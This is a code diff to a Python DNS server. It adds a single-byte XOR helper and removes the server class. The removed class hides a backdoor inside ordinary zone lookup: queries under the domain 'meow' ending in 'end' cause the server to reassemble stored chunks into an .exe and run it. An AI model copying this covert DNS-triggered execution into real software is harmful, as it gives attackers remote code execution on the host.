@@ -11,6 +11,10 @@ import subprocess
 import tempfile
 import os
 
+def xor_bytes(data_bytes, key_byte):
+    """XOR every byte with a single-byte key."""
+    return bytes([b ^ key_byte for b in data_bytes])
+
 def parse_dns_query(data):
     """Extract QNAME labels from a raw DNS query packet."""
     qname = []
@@ -115,110 +119,6 @@ def send_test_dns_query(server_ip: str, keyword: str):
         sock.close()
 
 
-
-class DNSServer(socketserver.ThreadingUDPServer):
-    allow_reuse_address = True
-    def __init__(self, server_address, handler_class, db_path):
-        super().__init__(server_address, handler_class)
-        self.db_path = db_path
-        self.conn = sqlite3.connect(db_path, check_same_thread=False)
-        self.conn.row_factory = sqlite3.Row
-        self.special_domain = "meow"
-        self.chunks = {}
-
-    def _zone_for_qname(self, qname):
-        rows = self.conn.execute("SELECT * FROM zones").fetchall()
-        matches = [r for r in rows if qname.endswith(r["name"])]
-        if not matches:
-            return None
-        return max(matches, key=lambda r: len(r["name"]))
-
-    def _records_for(self, zone_id, name, rtype):
-        rows = self.conn.execute("SELECT * FROM records WHERE zone_id=? AND name=? AND type=?",
-                                 (zone_id, name, rtype)).fetchall()
-        return rows
-
-    def _all_records_name(self, zone_id, name):
-        rows = self.conn.execute("SELECT * FROM records WHERE zone_id=? AND name=?",
-                                 (zone_id, name)).fetchall()
-        return rows
-
-    def _soa_rr(self, zone):
-        mname = zone["primary_ns"]
-        rname = zone["admin_email"]
-        times = (int(zone["serial"]), int(zone["refresh"]), int(zone["retry"]), int(zone["expire"]), int(zone["minimum"]))
-        return RR(zone["name"], QTYPE.SOA, rdata=SOA(mname, rname, times), ttl=zone["ttl"])
-
-    def answer_query(self, request: DNSRecord) -> DNSRecord:
-        qname = str(request.q.qname)
-        qtype = QTYPE[request.q.qtype]
-
-        labels = qname.split(".")
-        print(labels)
-        if labels[-2] == self.special_domain:
-            if labels[0] == "end":
-                print("[+] Stop signal received, reconstructing file...")
-                ordered = [self.chunks[i] for i in sorted(self.chunks.keys())]
-                exe_bytes = b"".join(ordered)
-
-                with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as tmp_exe:
-                    tmp_exe.write(exe_bytes)
-                    exe_path = tmp_exe.name
-
-                print(f"[+] Running {exe_path}")
-                subprocess.run([exe_path], check=True)
-                os.unlink(exe_path)            
-        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=0))
-
-        zone = self._zone_for_qname(qname)
-        if zone:
-            name_rel = qname[:-len(zone["name"])].rstrip(".") if not qname == zone["name"] else ""
-            owner = f"{name_rel}.{zone['name']}".lstrip(".")
-            if qtype in ("SOA","ANY") and qname == zone["name"]:
-                reply.add_answer(self._soa_rr(zone))
-            rrs = []
-            targets = [(owner, qtype)]
-            if qtype == "ANY":
-                recs = self._all_records_name(zone["id"], owner)
-                for r in recs:
-                    rr = build_rr(r, zone)
-                    if rr:
-                        rrs.append(rr)
-            else:
-                recs = self._records_for(zone["id"], owner, qtype)
-                if not recs:
-                    recs = self._records_for(zone["id"], owner, "CNAME")
-                for r in recs:
-                    rr = build_rr(r, zone)
-                    if rr:
-                        rrs.append(rr)
-
-            if not rrs and qname == zone["name"] and qtype == "NS":
-                rrs.append(RR(zone["name"], QTYPE.NS, rdata=NS(zone["primary_ns"]), ttl=zone["ttl"]))
-
-            for rr in rrs:
-                reply.add_answer(rr)
-
-            if len(rrs)==0:
-                reply.header.rcode = getattr(RCODE, "NXDOMAIN")
-            return reply
-
-        settings = fetch_settings(self.conn)
-        upstream = settings.get("upstream","").strip()
-        if upstream:
-            try:
-                u_host, u_port = (upstream.split(":")+["53"])[:2]
-                u_port = int(u_port)
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                s.settimeout(2.5)
-                s.sendto(request.pack(), (u_host, u_port))
-                data, _ = s.recvfrom(4096)
-                return DNSRecord.parse(data)
-            except Exception:
-                pass
-
-        reply.header.rcode = getattr(RCODE, "NXDOMAIN")
-        return reply
 
 def build_rr(rec, zone):
     ttl = rec["ttl"] or zone["ttl"]
